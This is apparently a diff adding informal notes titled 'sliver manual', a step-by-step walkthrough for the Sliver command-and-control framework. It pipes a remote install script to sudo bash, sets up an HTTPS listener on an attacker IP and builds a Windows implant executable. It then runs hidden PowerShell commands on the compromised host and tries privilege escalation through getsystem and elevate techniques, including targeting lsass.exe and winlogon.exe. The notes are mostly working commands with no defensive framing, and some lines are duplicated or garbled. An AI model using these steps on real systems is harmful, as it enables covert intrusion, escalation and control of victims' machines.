@@ -1,0 +1,59 @@
+sliver  manual
+sudo apt update
+sudo apt install python3-winrm
+curl https://sliver.sh/install | sudo bash
+cd sliver.sh
+bash install sliver.sh
+Run
+sliver
+Listener
+https --lhost Attacker IP --lport port number
+Check the listener
+jobs
+generate --http https://192.168.1.54:4432 --format exe --arch amd64 --save implant.exe
+now
+sessions 
+
+ interact with the session (replace 1 with your session ID):
+
+
+use ID number of the session
+
+Step 1: Query Event ID 4624 (Successful Logons)
+
+Now that you have an active session, run the first log query remotely:
+shell
+
+execute -o -h whoami
+
+execute -o powershell -c "Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 10 | Format-List TimeCreated, Message"
+ Or run it hidingly
+execute -o -h powershell -c "Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 10 | Format-List TimeCreated, Message"
+
+If facing permissions issues
+Run 
+Start-Process powershell -Verb RunAs -ArgumentList "-c Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 10 | Format-List TimeCreated, Message" -Wait
+
+wevtutil qe Security /c:10 /rd:true /f:text
+
+But if you are not an admin
+
+exit
+getsystem
+
+Try Alternative Elevation Techniques:
+
+elevate --technique namedpipe
+
+elevate --technique namedpipe
+
+elevate --technique tokens
+
+elevate --technique service
+
+
+getsystem --process winlogon.exe
+
+getsystem --process lsass.exe
+
+sessions
